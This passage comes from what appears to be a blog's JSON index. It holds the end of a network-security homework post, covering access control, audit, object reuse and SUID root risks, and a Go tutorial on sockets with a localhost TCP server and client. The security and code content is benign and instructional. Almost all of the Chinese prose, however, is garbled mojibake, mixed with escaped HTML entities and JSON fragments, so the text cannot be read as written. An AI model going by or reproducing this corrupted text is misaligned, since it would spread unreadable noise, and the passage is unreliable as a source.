è¦æ±‚ç³»ç»Ÿæä¾›å¼ºå¤§çš„ç”¨æˆ·èº«ä»½éªŒè¯æœºåˆ¶ï¼Œé˜²æ­¢æœªç»æˆæƒçš„ç”¨æˆ·ç™»å½•ç³»ç»Ÿã€‚\nè‡ªä¸»è®¿é—®æ§åˆ¶æœºåˆ¶ è¦æ±‚ç³»ç»Ÿæä¾›è‡ªä¸»è®¿é—®æ§åˆ¶æœºåˆ¶ï¼Œå…è®¸ç³»ç»Ÿç®¡ç†å‘˜æ ¹æ®éœ€è¦å¯¹ç³»ç»Ÿèµ„æºè¿›è¡Œè®¿é—®æ§åˆ¶ã€‚\nå®‰å…¨å®¡è®¡æœºåˆ¶ ç³»ç»Ÿå¿…é¡»æä¾›å®‰å…¨å®¡è®¡æœºåˆ¶ï¼Œä»¥è®°å½•ç³»ç»Ÿçš„å…³é”®æ“ä½œï¼Œä»¥ä¾¿åœ¨å‘ç”Ÿå®‰å…¨äº‹ä»¶æ—¶è¿›è¡Œè°ƒæŸ¥ã€‚\nå¯¹è±¡é‡ç”¨ä¿æŠ¤æœºåˆ¶ å¯¹è±¡é‡ç”¨ä¿æŠ¤æœºåˆ¶å°±æ˜¯æ®‹ç•™ä¿¡æ¯çš„å¤„ç†æœºåˆ¶ï¼Œå³ï¼šé˜»æ­¢ä¸€ä¸ªç”¨æˆ·åˆ©ç”¨æˆ–é˜…è¯»å¦ä¸€ä¸ªç”¨æˆ·å·²åˆ é™¤çš„æ•°æ®ï¼Œæˆ–è®¿é—®å¦ä¸€ä¸ªç”¨æˆ·æ›¾ç»ä½¿ç”¨å¹¶é‡Šæ”¾çš„å†…å­˜ã€‚\nåœ¨å“ªäº›æƒ…å†µä¸‹å¯èƒ½ä¼šå‘ç”Ÿè¾“å…¥éªŒè¯æ”»å‡»ã€‚\nç¨‹åºæ— æ³•è¾¨è®¤è¯­æ³•ä¸Šä¸æ­£ç¡®çš„è¾“å…¥ã€‚ æ¨¡å—æ¥å—äº†æ— å…³çš„è¾“å…¥ã€‚ æ¨¡å—æ²¡æœ‰èƒ½å¤Ÿå¤„ç†é—æ¼çš„è¾“å…¥åŸŸã€‚ å‘ç”Ÿäº†åŸŸå€¼ç›¸å…³æ€§é”™è¯¯ã€‚ ä¸ºä»€ä¹ˆrootå¯¹å…¶å¯æ‰§è¡Œæ–‡ä»¶è®¾ç½®ç”¨æˆ·IDè®¸å¯ä¼šå¸¦æ¥ä¸¥é‡çš„å®‰å…¨éšæ‚£?\nå› ä¸ºå½“æŸå¯æ‰§è¡Œæ–‡ä»¶æ˜¯rootåˆ›å»ºçš„ï¼Œå¦‚æœè®¾ç½®äº†SUIDï¼Œè€Œè¯¥å¯æ‰§è¡Œæ–‡ä»¶åˆè¢«èµ‹äºˆäº†å…¶ä»–æ™®é€šç”¨æˆ·çš„å¯æ‰§è¡Œæƒé™ï¼Œåˆ™è¯¥ç¨‹åºè¢«ä»»ä½•ç”¨æˆ·è¿è¡Œæ—¶ï¼Œå¯¹åº”çš„è¿›ç¨‹çš„euidæ˜¯rootï¼Œè¯¥è¿›ç¨‹å¯ä»¥è®¿é—®ä»»ä½•æ–‡ä»¶ã€‚\n","date":"2023-11-15T18:44:57+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A4/","title":"ç½‘ç»œå®‰å…¨ä½œä¸š4"},{"content":"2.1 å¥—æ¥å­—åè®®åŠå…¶æ•°æ®ä¼ è¾“ç‰¹æ€§ åè®® å¦‚æœç›¸éš”å¾ˆè¿œçš„ä¸¤äººæƒ³å±•å¼€å¯¹è¯,å¿…é¡»å…ˆå†³å®šå¯¹è¯æ–¹å¼ã€‚å¦‚æœä¸€æ–¹ä½¿ç”¨ç”µè¯,é‚£ä¹ˆå¦ä¸€æ–¹ä¹Ÿåªèƒ½ä½¿ç”¨ç”µè¯,è€Œä¸æ˜¯ä¹¦ä¿¡ã€‚å¯ä»¥è¯´,ç”µè¯å°±æ˜¯ä¸¤äººå¯¹è¯çš„åè®®ã€‚åè®®æ˜¯å¯¹è¯ä¸­ä½¿ç”¨çš„é€šä¿¡è§„åˆ™, æŠŠä¸Šè¿°æ¦‚å¿µæ‹“å±•åˆ°è®¡ç®—æœºé¢†åŸŸå¯æ•´ç†ä¸ºâ€œè®¡ç®—æœºé—´å¯¹è¯å¿…å¤‡é€šä¿¡è§„åˆ™â€ã€‚\nåˆ›å»ºå¥—æ¥å­— 1 2 3 4 5 6 #include \u0026lt;sys/socket.h\u0026gt; int socket (int domain, int type, int protocol); //æˆåŠŸæ—¶è¿”å›æ–‡ä»¶æè¿°ç¬¦,å¤±è´¥æ—¶è¿”å›-1ã€‚ //domain å¥—æ¥å­—ä¸­ä½¿ç”¨çš„åè®®æ—(Protocol Family)ä¿¡æ¯ã€‚ //type å¥—æ¥å­—æ•°æ®ä¼ è¾“ç±»å‹ä¿¡æ¯ã€‚ //protocol è®¡ç®—æœºé—´é€šä¿¡ä¸­ä½¿ç”¨çš„åè®®ä¿¡æ¯ã€‚ åœ¨ Go è¯­è¨€çš„Â syscallÂ åŒ…ä¸­ï¼ŒSocketÂ å‡½æ•°æ˜¯å¯¹åº•å±‚Â socketÂ ç³»ç»Ÿè°ƒç”¨çš„å°è£…ã€‚è¿™æ ·åšçš„ç›®çš„æ˜¯ä¸ºäº†æä¾›ä¸€ä¸ªæ›´åŠ  Go é£æ ¼ï¼ˆä¾‹å¦‚é”™è¯¯å¤„ç†ï¼‰çš„æ¥å£ï¼ŒåŒæ—¶éšè—ä¸€äº›åº•å±‚ç»†èŠ‚ã€‚\nSocketÂ å‡½æ•°å†…éƒ¨è°ƒç”¨äº†Â socketÂ å‡½æ•°ã€‚socketÂ å‡½æ•°ç›´æ¥æ‰§è¡Œäº†ç³»ç»Ÿè°ƒç”¨ï¼Œå¹¶è¿”å›äº†åŸå§‹çš„ç»“æœï¼ŒåŒ…æ‹¬ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦å’Œä¸€ä¸ªé”™è¯¯å·ã€‚ç„¶åÂ SocketÂ å‡½æ•°å°†è¿™äº›åŸå§‹ç»“æœè½¬æ¢ä¸º Go é£æ ¼çš„ç»“æœï¼šå¦‚æœç³»ç»Ÿè°ƒç”¨æˆåŠŸï¼Œå®ƒè¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦å’Œä¸€ä¸ªÂ nilÂ é”™è¯¯ï¼›å¦‚æœç³»ç»Ÿè°ƒç”¨å¤±è´¥ï¼Œå®ƒè¿”å›ä¸€ä¸ªÂ -1Â æ–‡ä»¶æè¿°ç¬¦å’Œä¸€ä¸ªéÂ nilÂ é”™è¯¯ã€‚\nè¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œå¯¹äºå¤§å¤šæ•° Go ç¨‹åºå‘˜æ¥è¯´ï¼Œä»–ä»¬åªéœ€è¦å…³å¿ƒÂ SocketÂ å‡½æ•°ï¼Œè€Œä¸éœ€è¦äº†è§£åº•å±‚çš„Â socketÂ ç³»ç»Ÿè°ƒç”¨å’Œé”™è¯¯å¤„ç†ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 // Socket å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„å¥—æ¥å­—ï¼Œå¹¶è¿”å›å…¶æ–‡ä»¶æè¿°ç¬¦å’Œå¯èƒ½çš„é”™è¯¯ã€‚ // domain å‚æ•°æŒ‡å®šäº†å¥—æ¥å­—çš„åè®®æ—ï¼ˆä¾‹å¦‚ï¼ŒAF_INET ä»£è¡¨ IPv4ï¼ŒAF_INET6 ä»£è¡¨ IPv6ï¼‰ã€‚ // typ å‚æ•°æŒ‡å®šäº†å¥—æ¥å­—çš„ç±»å‹ï¼ˆä¾‹å¦‚ï¼ŒSOCK_STREAM ä»£è¡¨ TCPï¼ŒSOCK_DGRAM ä»£è¡¨ UDPï¼‰ã€‚ // proto å‚æ•°æŒ‡å®šäº†å¥—æ¥å­—ä½¿ç”¨çš„åè®®ï¼ˆä¾‹å¦‚ï¼ŒIPPROTO_TCP ä»£è¡¨ TCPï¼ŒIPPROTO_UDP ä»£è¡¨ UDPï¼‰ã€‚ func Socket(domain, typ, proto int) (fd int, err error) { // å¦‚æœ domain æ˜¯ AF_INET6ï¼ˆå³ï¼Œæˆ‘ä»¬æ­£åœ¨å°è¯•åˆ›å»ºä¸€ä¸ª IPv6 å¥—æ¥å­—ï¼‰ï¼Œ // ä½†æ˜¯ SocketDisableIPv6 ä¸º trueï¼ˆå³ï¼Œæˆ‘ä»¬ç¦ç”¨äº† IPv6ï¼‰ï¼Œåˆ™è¿”å›é”™è¯¯ EAFNOSUPPORTã€‚ if domain == AF_INET6 \u0026amp;\u0026amp; SocketDisableIPv6 { return -1, EAFNOSUPPORT } // è°ƒç”¨åº•å±‚çš„ socket å‡½æ•°åˆ›å»ºå¥—æ¥å­—ã€‚ fd, err = socket(domain, typ, proto) return } // socket å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„å¥—æ¥å­—ï¼Œå¹¶è¿”å›å…¶æ–‡ä»¶æè¿°ç¬¦å’Œå¯èƒ½çš„é”™è¯¯ã€‚ // domain å‚æ•°æŒ‡å®šäº†å¥—æ¥å­—çš„åè®®æ—ï¼ˆä¾‹å¦‚ï¼ŒAF_INET ä»£è¡¨ IPv4ï¼ŒAF_INET6 ä»£è¡¨ IPv6ï¼‰ã€‚ // typ å‚æ•°æŒ‡å®šäº†å¥—æ¥å­—çš„ç±»å‹ï¼ˆä¾‹å¦‚ï¼ŒSOCK_STREAM ä»£è¡¨ TCPï¼ŒSOCK_DGRAM ä»£è¡¨ UDPï¼‰ã€‚ // proto å‚æ•°æŒ‡å®šäº†å¥—æ¥å­—ä½¿ç”¨çš„åè®®ï¼ˆä¾‹å¦‚ï¼ŒIPPROTO_TCP ä»£è¡¨ TCPï¼ŒIPPROTO_UDP ä»£è¡¨ UDPï¼‰ã€‚ // rawSyscall å‡½æ•°æ‰§è¡Œä¸€ä¸ªåº•å±‚çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå…¶å‚æ•°æ˜¯ç³»ç»Ÿè°ƒç”¨çš„ç¼–å·å’Œå‚æ•°ã€‚ // å¦‚æœç³»ç»Ÿè°ƒç”¨å¤±è´¥ï¼Œå®ƒè¿”å›ä¸€ä¸ªéé›¶çš„é”™è¯¯å· e1ï¼Œæˆ‘ä»¬å°†å…¶è½¬æ¢ä¸º Go çš„ error ç±»å‹å¹¶è¿”å›ã€‚ func socket(domain int, typ int, proto int) (fd int, err error) { r0, _, e1 := rawSyscall(abi.FuncPCABI0(libc_socket_trampoline), uintptr(domain), uintptr(typ), uintptr(proto)) fd = int(r0) if e1 != 0 { err = errnoErr(e1) } return } åè®®æ—(Protocol Family) é€šè¿‡socketå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’å¥—æ¥å­—ä¸­ä½¿ç”¨çš„åè®®åˆ†ç±»ä¿¡æ¯ã€‚æ­¤åè®®åˆ†ç±»ä¿¡æ¯ç§°ä¸ºåè®®æ—ã€‚ åŸæ–‡ç»™çš„cè¯­è¨€å¤´æ–‡ä»¶ä¸­çš„åˆ†ç±» åœ¨ Go è¯­è¨€çš„Â syscallÂ åŒ…ä¸­ï¼ŒdomainÂ å‚æ•°ç”¨äºæŒ‡å®šå¥—æ¥å­—çš„åè®®æ—ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„Â domainÂ å€¼ï¼š\nå€¼ æè¿° AF_INET IPv4 ç½‘ç»œåè®® AF_INET6 IPv6 ç½‘ç»œåè®® AF_UNIX UNIX åŸŸå¥—æ¥å­— AF_NETLINK å†…æ ¸ç”¨æˆ·æ¥å£è®¾å¤‡ AF_PACKET ä½çº§åŒ…æ¥å£ AF_CAN Controller Area Network AF_BLUETOOTH è“ç‰™è®¾å¤‡ è¯·æ³¨æ„ï¼Œä¸æ˜¯æ‰€æœ‰çš„Â domainÂ å€¼éƒ½åœ¨æ‰€æœ‰çš„å¹³å°ä¸Šå¯ç”¨ã€‚å…·ä½“å¯ç”¨çš„Â domainÂ å€¼å–å†³äºä½ çš„æ“ä½œç³»ç»Ÿå’Œå¹³å°ã€‚\nå¥—æ¥å­—ç±»å‹(Type) å¥—æ¥å­—ç±»å‹æŒ‡çš„æ˜¯å¥—æ¥å­—çš„æ•°æ®ä¼ è¾“æ–¹å¼,é€šè¿‡socketå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ä¼ é€’,åªæœ‰è¿™æ ·æ‰èƒ½å†³å®šåˆ›å»ºçš„å¥—æ¥å­—çš„æ•°æ®ä¼ è¾“æ–¹å¼ã€‚è¿™ç§è¯´æ³•å¯èƒ½ä¼šä½¿å„ä½æ„Ÿåˆ°ç–‘æƒ‘ã€‚å·²é€šè¿‡ç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’äº†åè®®æ—ä¿¡æ¯,è¿˜è¦å†³å®šæ•°æ®ä¼ è¾“æ–¹å¼?é—®é¢˜å°±åœ¨äº,å†³å®šäº†åè®®æ—å¹¶ä¸èƒ½åŒæ—¶å†³å®šæ•°æ®ä¼ è¾“æ–¹å¼,æ¢è¨€ä¹‹,socketæ•°ç¬¬ä¸€ä¸ªå‚æ•°PF_INETåè®®æ—ä¸­ä¹Ÿå­˜åœ¨å¤šç§æ•°æ®ä¼ è¾“æ–¹å¼ã€‚\né¢å‘è¿æ¥çš„å¥—æ¥å­—(SOCK_STREAM) å¦‚æœå‘socketå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ä¼ é€’SOCK_STREAM,å°†åˆ›å»ºé¢å‘è¿æ¥çš„å¥—æ¥å­—ã€‚é¢å‘è¿æ¥çš„å¥—æ¥å­—åˆ°åº•å…·æœ‰å“ªäº›ç‰¹ç‚¹å‘¢?\nå¥—æ¥å­—è¿æ¥å¿…é¡»ä¸€ä¸€å¯¹åº” ä¼ è¾“è¿‡ç¨‹ä¸­æ•°æ®ä¸ä¼šæ¶ˆå¤± æŒ‰åºä¼ è¾“æ•°æ® ä¼ è¾“çš„æ•°æ®ä¸å­˜åœ¨æ•°æ®è¾¹ç•Œ æ”¶å‘æ•°æ®çš„å¥—æ¥å­—å†…éƒ¨æœ‰ç¼“å†²(buffer),ç®€è¨€ä¹‹å°±æ˜¯å­—èŠ‚æ•°ç»„ã€‚é€šè¿‡å¥—æ¥å­—ä¼ è¾“çš„æ•°æ®å°†ä¿å­˜åˆ°è¯¥æ•°ç»„ã€‚å› æ­¤,æ”¶åˆ°æ•°æ®å¹¶ä¸æ„å‘³ç€é©¬ä¸Šè°ƒç”¨readå‡½æ•°ã€‚åªè¦ä¸è¶…è¿‡æ•°ç»„å®¹é‡,åˆ™æœ‰å¯èƒ½åœ¨æ•°æ®å¡«å……æ»¡ç¼“å†²åé€šè¿‡1æ¬¡readå‡½æ•°è°ƒç”¨è¯»å–å…¨éƒ¨,ä¹Ÿæœ‰å¯èƒ½åˆ†æˆå¤šæ¬¡readå‡½æ•°è°ƒç”¨è¿›è¡Œè¯»å–ã€‚ä¹Ÿå°±æ˜¯è¯´,åœ¨é¢å‘è¿æ¥çš„å¥—æ¥å­—ä¸­,readå‡½æ•°å’Œwriteå‡½æ•°çš„è°ƒç”¨æ¬¡æ•°å¹¶æ— å¤ªå¤§æ„ä¹‰ã€‚æ‰€ä»¥è¯´é¢å‘è¿æ¥çš„å¥—æ¥å­—ä¸å­˜åœ¨æ•°æ®è¾¹ç•Œã€‚\nå¥—æ¥å­—ç¼“å†²å·²æ»¡æ˜¯å¦æ„å‘³ç€æ•°æ®ä¸¢å¤± ä¹‹å‰è®²è¿‡,ä¸ºäº†æ¥æ”¶æ•°æ®,å¥—æ¥å­—å†…éƒ¨æœ‰ä¸€ä¸ªç”±å­—èŠ‚æ•°ç»„æ„æˆçš„ç¼“å†²ã€‚å¦‚æœè¿™ä¸ªç¼“å†²è¢«æ¥æ”¶çš„æ•°æ®å¡«æ»¡ä¼šå‘ç”Ÿä»€ä¹ˆäº‹æƒ…?ä¹‹åä¼ é€’çš„æ•°æ®æ˜¯å¦ä¼šä¸¢å¤±? é¦–å…ˆè°ƒç”¨readå‡½æ•°ä»ç¼“å†²è¯»å–éƒ¨åˆ†æ•°æ®,å› æ­¤,ç¼“å†²å¹¶ä¸æ€»æ˜¯æ»¡çš„ã€‚ä½†å¦‚æœreadå‡½æ•°è¯»å–é€Ÿåº¦æ¯”æ¥æ”¶æ•°æ®çš„é€Ÿåº¦æ…¢,åˆ™ç¼“å†²æœ‰å¯èƒ½è¢«å¡«æ»¡ã€‚æ­¤æ—¶å¥—æ¥å­—æ— æ³•å†æ¥æ”¶æ•°æ®, ä½†å³ä½¿è¿™æ ·ä¹Ÿä¸ä¼šå‘ç”Ÿæ•°æ®ä¸¢å¤±,å› ä¸ºä¼ è¾“ç«¯å¥—æ¥å­—å°†åœæ­¢ä¼ è¾“ã€‚ä¹Ÿå°±æ˜¯è¯´,é¢å‘è¿æ¥çš„å¥—æ¥å­—ä¼šæ ¹æ®æ¥æ”¶ç«¯çš„çŠ¶æ€ä¼ è¾“æ•°æ®,å¦‚æœä¼ è¾“å‡ºé”™è¿˜ä¼šæä¾›é‡ä¼ æœåŠ¡ã€‚å› æ­¤,é¢å‘è¿æ¥çš„å¥—æ¥å­—é™¤ç‰¹æ®Šæƒ…å†µå¤–ä¸ä¼šå‘ç”Ÿæ•°æ®ä¸¢å¤±ã€‚\né¢å‘æ¶ˆæ¯çš„å¥—æ¥å­—(SOCK_DGRAM) å¦‚æœå‘socketå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ä¼ é€’SOCK_DGRAM,åˆ™å°†åˆ›å»ºé¢å‘æ¶ˆæ¯çš„å¥—æ¥å­—ã€‚é¢å‘æ¶ˆæ¯çš„å¥—æ¥å­—å¯ä»¥æ¯”å–»æˆé«˜é€Ÿç§»åŠ¨çš„æ‘©æ‰˜è½¦å¿«é€’ã€‚\nå¼ºè°ƒå¿«é€Ÿä¼ è¾“è€Œéä¼ è¾“é¡ºåº ä¼ è¾“çš„æ•°æ®å¯èƒ½ä¸¢å¤±ä¹Ÿå¯èƒ½æŸæ¯ ä¼ è¾“çš„æ•°æ®æœ‰æ•°æ®è¾¹ç•Œ é™åˆ¶æ¯æ¬¡ä¼ è¾“çš„æ•°æ®å¤§å° ä¼—æ‰€å‘¨çŸ¥,å¿«é€’è¡Œä¸šçš„é€Ÿåº¦å°±æ˜¯ç”Ÿå‘½ã€‚ç”¨æ‘©æ‰˜è½¦å‘å¾€åŒä¸€ç›®çš„åœ°çš„2ä»¶åŒ…è£¹æ— éœ€ä¿è¯é¡ºåº, åªè¦ä»¥æœ€å¿«é€Ÿåº¦äº¤ç»™å®¢æˆ·å³å¯ã€‚è¿™ç§æ–¹å¼å­˜åœ¨æŸåæˆ–ä¸¢å¤±çš„é£é™©,è€Œä¸”åŒ…è£¹å¤§å°æœ‰ä¸€å®šé™åˆ¶ã€‚å› æ­¤,è‹¥è¦ä¼ é€’å¤§é‡åŒ…è£¹,åˆ™éœ€åˆ†æ‰¹å‘é€ã€‚å¦å¤–,å¦‚æœç”¨2è¾†æ‘©æ‰˜è½¦åˆ†åˆ«å‘é€2ä»¶åŒ…è£¹,åˆ™æ¥æ”¶è€…ä¹Ÿéœ€è¦åˆ†2æ¬¡æ¥æ”¶ã€‚è¿™ç§ç‰¹æ€§å°±æ˜¯â€œä¼ è¾“çš„æ•°æ®å…·æœ‰æ•°æ®è¾¹ç•Œâ€ã€‚\né¢å‘æ¶ˆæ¯çš„å¥—æ¥å­—æ¯”é¢å‘è¿æ¥çš„å¥—æ¥å­—å…·æœ‰æ›´å¿«çš„ä¼ è¾“é€Ÿåº¦,ä½†æ— æ³•é¿å…æ•°æ®ä¸¢å¤±æˆ–æŸæ¯ã€‚å¦å¤–,æ¯æ¬¡ä¼ è¾“çš„æ•°æ®å¤§å°å…·æœ‰ä¸€å®šé™åˆ¶,å¹¶å­˜åœ¨æ•°æ®è¾¹ç•Œã€‚å­˜åœ¨æ•°æ®è¾¹ç•Œæ„å‘³ç€æ¥æ”¶æ•°æ®çš„æ¬¡æ•°åº”å’Œä¼ è¾“æ¬¡æ•°ç›¸åŒã€‚é¢å‘æ¶ˆæ¯çš„å¥—æ¥å­—ç‰¹æ€§æ€»ç»“å¦‚ä¸‹: â€œä¸å¯é çš„ã€ä¸æŒ‰åºä¼ é€’çš„ã€ä»¥æ•°æ®çš„é«˜é€Ÿä¼ è¾“æ²Ÿç›®çš„çš„å¥—æ¥å­—\u0026quot;\næœ€ç»ˆé€‰æ‹©çš„åè®® ä¸‹é¢è®²è§£socketå‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°,è¯¥å‚æ•°å†³å®šæœ€ç»ˆé‡‡ç”¨çš„åè®®ã€‚ å‰é¢å·²ç»é€šè¿‡socketå‡½æ•°çš„å‰ä¸¤ä¸ªå‚æ•°ä¼ é€’äº†åè®®æ—ä¿¡æ¯å’Œå¥—æ¥å­—æ•°æ®ä¼ è¾“æ–¹å¼,è¿™äº›ä¿¡æ¯è¿˜ä¸è¶³ä»¥å†³å®šé‡‡ç”¨çš„åè®®å—?ä¸ºä»€ä¹ˆè¿˜éœ€è¦ä¼ é€’ç¬¬3ä¸ªå‚æ•°å‘¢? ä¼ é€’å‰ä¸¤ä¸ªå‚æ•°å³å¯åˆ›å»ºæ‰€éœ€å¥—æ¥å­—ã€‚æ‰€ä»¥å¤§éƒ¨åˆ†æƒ…å†µä¸‹å¯ä»¥å‘ç¬¬ä¸‰ä¸ªå‚æ•°ä¼ é€’0,é™¤éé‡åˆ°ä»¥ä¸‹è¿™ç§æƒ…å†µ: â€œåŒä¸€åè®®æ—ä¸­å­˜åœ¨å¤šä¸ªæ•°æ®ä¼ è¾“æ–¹å¼ç›¸åŒçš„åè®®â€æ•°æ®ä¼ è¾“æ–¹å¼ç›¸åŒ,ä½†åè®®ä¸åŒã€‚æ­¤æ—¶éœ€è¦é€šè¿‡ç¬¬ä¸‰ä¸ªå‚æ•°å…·ä½“æŒ‡å®šåè®®ä¿¡æ¯ã€‚\nTCPå¥—æ¥å­—ç¤ºä¾‹ tcp_server.go (ç³»ç»Ÿå‡½æ•°è°ƒç”¨ç‰ˆ)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;os\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;syscall\u0026#34; ) func main() { if len(os.Args) != 2 { fmt.Printf(\u0026#34;Usage: %s \u0026lt;port\u0026gt;\\n\u0026#34;, os.Args[0]) } port, _ := strconv.Atoi(os.Args[1]) //1.åˆ›å»ºä¸€ä¸ª TCP å¥—æ¥å­—ã€‚ fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0) if err != nil { fmt.Printf(\u0026#34;socket() error: %v\u0026#34;, err) } //2.å°†å¥—æ¥å­—ç»‘å®šåˆ°æŒ‡å®šçš„ IP åœ°å€å’Œç«¯å£å·ã€‚ // åˆ›å»ºä¸€ä¸ª SockaddrInet4 ç»“æ„ä½“å®ä¾‹ï¼Œå¹¶è®¾ç½®ç«¯å£å· servAddr := \u0026amp;syscall.SockaddrInet4{Port: port} // å°† IP åœ°å€è®¾ç½®ä¸º 0.0.0.0ï¼Œè¿™æ ·æœåŠ¡å™¨å¯ä»¥æ¥å—æ¥è‡ªä»»ä½•å®¢æˆ·ç«¯çš„è¿æ¥ copy(servAddr.Addr[:], []byte{0, 0, 0, 0}) err = syscall.Bind(fd, servAddr) if err != nil { log.Fatalf(\u0026#34;bind() error: %v\u0026#34;, err) } //3.å°†å¥—æ¥å­—è½¬ä¸ºå¯æ¥æ”¶è¿æ¥çŠ¶æ€ err = syscall.Listen(fd, 10) if err != nil { log.Fatalf(\u0026#34;listen() error: %v\u0026#34;, err) } //4.Accept()æ¥æ”¶è¿æ¥ connFd, _, err := syscall.Accept(fd) if err != nil { log.Fatalf(\u0026#34;accept() error: %v\u0026#34;, err) } //5.write()å‘é€ä¿¡æ¯ message := \u0026#34;Hello world!\u0026#34; _, err = syscall.Write(connFd, []byte(message)) if err != nil { log.Fatalf(\u0026#34;write() error: %v\u0026#34;, err) } syscall.Close(connFd) syscall.Close(fd) } tcp_clinet.go æ›´æ”¹readå‡½æ•°è°ƒç”¨æ–¹å¼ï¼Œåœ¨å®¢æˆ·ç«¯ä¸­åˆ†å¤šæ¬¡è°ƒç”¨readå‡½æ•°ä»¥æ¥æ”¶æœåŠ¡å™¨ç«¯å‘é€çš„å…¨éƒ¨æ•°æ®,ä»¥éªŒè¯tcpä¼ è¾“çš„æ•°æ®ä¸å­˜åœ¨æ•°æ®è¾¹ç•Œã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;os\u0026#34; \u0026#34;strconv\u0026#34; \u0026#34;syscall\u0026#34; ) func main() { if len(os.Args) != 3 { log.Fatalf(\u0026#34;Usage: %s \u0026lt;IP\u0026gt; \u0026lt;port\u0026gt;\\n\u0026#34;, os.Args[0]) } ip := os.Args[1] portStr := os.Args[2] port, err := strconv.Atoi(portStr) if err != nil { log.Fatalf(\u0026#34;Invalid port number: %s\\n\u0026#34;, portStr) } fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0) // è®¾ç½®æœåŠ¡å™¨çš„åœ°å€å’Œç«¯å£ servAddr := \u0026amp;syscall.SockaddrInet4{Port: port} copy(servAddr.Addr[:], net.ParseIP(ip).To4()) // ä½¿ç”¨ syscall.Connect å‡½æ•°å°†å¥—æ¥å­—è¿æ¥åˆ°æœåŠ¡å™¨ err = syscall.Connect(fd, servAddr) if err != nil { log.Fatalf(\u0026#34;connect() error: %v\u0026#34;, err) } // ä½¿ç”¨ syscall.Read æ¥æ”¶ä¿¡æ¯ buf := make([]byte, 1024) message := make([]byte, 0) for { n, err := syscall.Read(fd, buf) if err != nil { if err != io.EOF { log.Fatalf(\u0026#34;Read error: %v\u0026#34;, err) } break } if n == 0 { break } message = append(message, buf[:n]...) } fmt.Printf(\u0026#34;Message from server: %s\\n\u0026#34;, message) fmt.Printf(\u0026#34;Function read() read %d bytes\\n\u0026#34;, len(message)) syscall.Close(fd) } è¿è¡Œ\n1 2 3 4 5 6 7 8 go build -o ch2/tcpServer/tcp_server ch2/tcpServer/tcp_server.go go build -o ch2/tcpClient/tcp_client ch2/tcpClient/tcp_client.go ./ch2/tcpServer/tcp_server 8888 ./ch2/tcpClient/tcp_client 127.0.0.1 8888 Message from server: Hello world! Function read() read 12 bytes 2.2 Windowså¹³å°å•Šä¸‹çš„å®ç°åŠéªŒè¯ ç•¥\n2.3 ä¹ é¢˜ ä»€ä¹ˆæ˜¯åè®®?åœ¨æ”¶å‘æ•°æ®ä¸­å®šä¹‰åè®®æœ‰ä½•æ„ä¹‰?\né¢å‘è¿æ¥çš„TCPå¥—æ¥å­—ä¼ è¾“ç‰¹æ€§æœ‰3ç‚¹,è¯·åˆ†åˆ«è¯´æ˜ã€‚\næ— æ•°æ®è¾¹ç•Œ ä¼ è¾“è¿‡ç¨‹ä¸­æ•°æ®ä¸ä¼šæ¶ˆå¤± æŒ‰åºä¼ è¾“ ä¸‹åˆ—å“ªäº›æ˜¯é¢å‘æ¶ˆæ¯çš„å¥—æ¥å­—çš„ç‰¹æ€§? a. ä¼ è¾“æ•°æ®å¯èƒ½ä¸¢å¤± b. æ²¡æœ‰æ•°æ®è¾¹ç•Œ(Boundary) ï¼ˆé¢å‘è¿æ¥ï¼‰ c. ä»¥å¿«é€Ÿä¼ é€’ä¸ºç›®æ ‡ d. ä¸é™åˆ¶æ¯æ¬¡ä¼ é€’æ•°æ®çš„å¤§å° ï¼ˆé™åˆ¶å¤§å°ï¼‰ e. ä¸é¢å‘è¿æ¥çš„å¥—æ¥å­—ä¸åŒ,ä¸å­˜åœ¨è¿æ¥çš„æ¦‚å¿µ\nä¸‹åˆ—æ•°æ®é€‚åˆç”¨å“ªç±»å¥—æ¥å­—ä¼ è¾“?å¹¶ç»™å‡ºåŸå› ã€‚\na. æ¼”å”±ä¼šç°åœºç›´æ’­çš„å¤šåª’ä½“æ•°æ®(é¢å‘æ¶ˆæ¯) å› ä¸ºé¢å‘æ¶ˆæ¯çš„å¥—æ¥å­—ä»¥å¿«é€Ÿä¼ é€’ä¸ºç›®æ ‡ï¼Œé€‚åˆä¼ è¾“å¤šåª’ä½“æ•°æ®ï¼Œå³ä½¿ä¼ è¾“æ•°æ®å¯èƒ½ä¸¢å¤±ä¹Ÿä¸ä¼šå½±å“æ•´ä½“æ•ˆæœã€‚ b. æŸäººå‹ç¼©è¿‡çš„æ–‡æœ¬æ–‡ä»¶(é¢å‘è¿æ¥) å› ä¸ºé¢å‘è¿æ¥çš„å¥—æ¥å­—å¯ä»¥ä¿è¯æ•°æ®çš„å¯é ä¼ è¾“ï¼Œé€‚åˆä¼ 